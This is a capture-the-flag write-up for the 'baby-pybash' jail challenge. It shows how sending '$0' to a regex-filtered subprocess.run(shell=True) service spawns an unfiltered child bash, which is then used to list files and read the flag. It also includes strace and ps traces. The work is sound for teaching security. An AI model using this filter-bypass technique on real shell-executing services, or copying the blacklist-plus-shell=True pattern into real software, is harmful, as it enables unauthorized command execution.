---
permalink: /ctf/2024/cyberspace/baby-pybash
layout: page
---

# baby-pybash

This write-up is also publically available on CTFTime [here](https://ctftime.org/task/28913).

The challenge source files can be found in full [here](https://github.com/crollins18/dev/tree/main/ctf/2024/cyberspace/baby-pybash/challenge). _I highly suggest reading over these files first to get an idea of the environment before proceeding._

### Summary
> This challenge is a jail style challenge in which we are given a remote shell that screens input from the user. If it is an allowed command it is executed. We will seek a solution in which we can bypass the restrictions to print out a `flag.txt` file on the server, for which we would have no other way to access except through an exploit. Finding the contents of the flag shows that you have gained unauthorized access to the internals of the server.

### Getting Started
We are given a local copy of the server side source code for baby-pybash, including a `Dockerfile` to allow for easy building. This also means that we can see the exact code mechanisms in Python that are used to filter input before executing it.

```python
def restrict_input(command):
    pattern = re.compile(r'[a-zA-Z*^\,,;\\!@/#?%`"\'&()-+]|[^\x00-\x7F]')
    if pattern.search(command):
        raise ValueError("that's not nice!")
    return command
```

We can see that the Python <code>re</code> regular expression package with pattern <code>[a-zA-Z*^\,,;\\!@/#?%`"\'&()-+]|[^\x00-\x7F]</code> is what will raise a <code>ValueError</code> and redirect the flow of control away our input ever getting passed to the shell. In plain english, this code snippet means that only the following characters are allowed. Otherwise our command will not be executed/accepted by the server.

```
$
-
.
0
1
2
3
4
5
6
7
8
9
:
<
=
>
[
]
_
{
|
}
~
```

If we can get past the filter, the input is handed off to the shell using `subprocess.run()`. 

```python
def execute_command(command):
    safe = restrict_input(command)
    result = subprocess.run(safe, stdout=True, shell=True)
    return result.stdout
```

### Refresher on Process Management
The basics of OS process management can lead us to guess this function will under the hood duplicate itself via `fork()` and in the new process `exeve()` the command we want. This is how all shells inclulding bash work under the hood. Let's write a simple python program with just the `subprocess.run()` call on a command say....`ls` to illustrate this.

```python
import subprocess

subprocess.run("ls", stdout=True, shell=True)
```

We can then use another tool called `strace` which will print out system calls made (and their parameters). The specific flags to strace seen below dictate that we want to follow forks (`-f`) and that instead of printing out all the system calls (there are alot of them), that we just want to look at the important ones for this demonstration (`fork()`, `execve()`, and `exit()`).

<pre>
ccrollin@thinkpad-p43s:~/.../baby-pybash$ strace -f -e trace=fork,execve,exit python3 execsyscall.py 
execve("/usr/bin/python3", ["python3", "execsyscall.py"], 0x7ffd11560f70 /* 64 vars */) = 0 <======== REPLACE CURRENT PROCESS WITH python3 executable
strace: Process 440529 attached <====== a result of fork()
[pid 440529] execve("/bin/bash", ["/bin/bash", "-c", "ls"], 0x7ffca1f7f460 /* 64 vars */) = 0 <======== REPLACE CURRENT PROCESS WITH bash executable
strace: Process 440530 attached <====== a result of fork()
[pid 440530] execve("/usr/bin/ls", ["ls"], 0x5b5ee89560d8 /* 64 vars */) = 0 <======== REPLACE CURRENT PROCESS with ls
challenge  execsyscall.py  README.md  trace-subprocess-run.txt <============= OUTPUT RESULTS FROM RUNNING ls
[pid 440530] +++ exited with 0 +++
[pid 440529] --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=440530, si_uid=1000, si_status=0, si_utime=0, si_stime=0} ---
[pid 440529] +++ exited with 0 +++
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=440529, si_uid=1000, si_status=0, si_utime=0, si_stime=0} ---
+++ exited with 0 +++
ccrollin@thinkpad-p43s:~/.../baby-pybash$ 
</pre>

Let's look a little further at those parameters to `execve()`. We can use section 2 of the Linux Programmer's Manual (`man`) to see the documentation for this system call.

`man 2 execve`

```
execve - execute program

int execve(const char *pathname, char *const argv[], char *const envp[]);
```

Now lets compare that signature with what `strace` gave us.

`[pid 440529] execve("/bin/bash", ["/bin/bash", "-c", "ls"], 0x7ffca1f7f460 /* 64 vars */) = 0 `

This leads us to the following:

```
char *pathname = "/bin/bash"
(path to executable)

char *const argv[] = ["/bin/bash", "-c", "ls"]
(argument vector passed to the executable)

char *const envp[] = 0x7ffca1f7f460
(environment variable vector, abbreviated as a memory address of the ptr to buffer since there are 64 variables in the buffer)
```

### Looking Closer at `argv`
The `argv` is what want to look closer at. Most programming languages including Python, C, Java, and many more rely on the arguments vector to specify how the program runs. Let's also remember that while we often think of `bash` as a terminal environment, those same terminal commands can be placed inside a script file. How would a bash script access those arguments?

With special variables of course! This is where experiance scripting comes in handy. When I looked at the different allowed characters from earlier I knew that `$0`, `$1`, `$2`, etc. would be allowed. Let's see what `$0` is by calling `echo $0`.

```python
import subprocess

subprocess.run("echo $0", stdout=True, shell=True)
```

```
ccrollin@thinkpad-p43s:~/.../baby-pybash$ python3 checkdollarzero.py 
/bin/bash
ccrollin@thinkpad-p43s:~/.../baby-pybash$
```

This makes sense from what we saw earlier in `strace`. In our `argv`, the first element at index `0`, referred to by bash as `$0`, is `/bin/bash`.

### An Experiment of Sorts
What happens when you are in a shell, and then call `bash`? Just as we saw earlier, the shell creates a duplicate of itself, exces the new process, and **then returns when the new process finishes by calling `exit()`**. **This bolded section will become important later!**. Here I try to illustrate this with the parent process, the `fish` shell calling a child process `bash`.

```
Welcome to fish, the friendly interactive shell
Type help for instructions on how to use fish
ccrollin@thinkpad-p43s ~> echo "I am in another shell called fish for demonstration purposes"
I am in another shell called fish for demonstration purposes
ccrollin@thinkpad-p43s ~> 
ccrollin@thinkpad-p43s ~> /bin/bash
ccrollin@thinkpad-p43s:~$ 
ccrollin@thinkpad-p43s:~$ echo $0
/bin/bash
ccrollin@thinkpad-p43s:~$ exit
exit
ccrollin@thinkpad-p43s ~> echo "I am back in fish"
I am back in fish
ccrollin@thinkpad-p43s ~> 
```

See how we got into a new child `bash` shell, we just provided the path to the executable....and remember our `$0` variable equals `/bin/bash`.....and the character `$` and `0` are in the allowed characters list from above....

You thinking what I am thinking?

### Yahtzee!
```
ccrollin@thinkpad-p43s ~/D/c/2/c/b/challenge> nc baby-pybash.challs.csc.tf 1337
== proof-of-work: disabled ==
Welcome to Baby PyBash!

Enter a bash command: $0
ls
chall.py
flag.txt
run.sh
cat flag.txt
CSCTF{b4sH_w1z4rd_0r_ju$t_ch33s3_m4st3r?_c1d4eeb2a}
```

We are now able to run previously "restricted" commands and print the flag out. When we give the first bash shell `$0`, we get another child process also of `bash`. _On face value this seems odd and useless, but there is much more to note_.

### The Why
> Why does the technique shown above allow us to input any commands/characters?

This is because the child `bash` process never calls the `exit()` system call. **According to the program logic as it is given, the Python parent process only reads from standard input before an executed command to the parent `bash` process terminates (calls `exit()`)**. 

Since the first command we give to `subprocess.run()` (remember under the hood is `bash`) is `/bin/bash` (by proxy of `$0`) and not something like `ls` that prints and immediately terminates, the parent Python process is perpetually in the [waiting/blocking state](https://en.wikipedia.org/wiki/Process_state#Blocked).

```python
print("Welcome to Baby PyBash!\n")
cmd = input("Enter a bash command: ") # READ INPUT FOR SCREENING AGAINST PROHIBITED CHARACTERS
output = execute_command(cmd) # calls subprocess.run(), see earlier snippet of execute_command() above

# this is where our main python process will wait indefinitely
# meaning this line below is never reached
print(output)
```

See the `strace` output for when the exploit is run to provide further clarificiation.

```
463843 execve("/usr/bin/python3", ["python3", "-u", "chall.py"], 0x7fff85204440 /* 53 vars */) = 0 <====== RUNNNG Python parent process

463907 execve("/bin/bash", ["/bin/bash", "-c", "$0"], 0x7fffba6848d8 /* 53 vars */) = 0 <====== Python parent process waits, user inputs /bin/bash to bash

463908 execve("/bin/bash", ["/bin/bash"], 0x63d4f08b3e98 /* 53 vars */) = 0 <========== This is the child bash process to the parent bash process above

463938 execve("/usr/bin/ls", ["ls"], 0x6457241080d8 /* 53 vars */) = 0 <======== This child bash process will continue accepting input while Python parent still waiting


463938 +++ exited with 0 +++

463978 execve("/usr/bin/cat", ["cat", "flag.txt"], 0x645724108468 /* 53 vars */) = 0
463978 +++ exited with 0 +++

****** NOTICE bash NEVER calls exit() *******
```

The `ps` tool (a terminal version of say Windows Task Manager) and `pstree` can give us a nice visually process tree too.

```
ccrollin@thinkpad-p43s ~/D/c/2/cyberspace> ps -a
    PID TTY          TIME CMD
   2734 tty2     00:00:00 fish
   2743 tty2     00:00:00 gnome-session-b
 472460 pts/3    00:00:00 python3
 472515 pts/3    00:00:00 bash
 472516 pts/3    00:00:00 bash
 473474 pts/4    00:00:00 ps

ccrollin@thinkpad-p43s ~/D/c/2/cyberspace> pstree -p 472460 # start process tree at root python process with process ID (PID) 472460

python3(472460)───bash(472515)───bash(472516)

ccrollin@thinkpad-p43s ~/D/c/2/cyberspace> 
```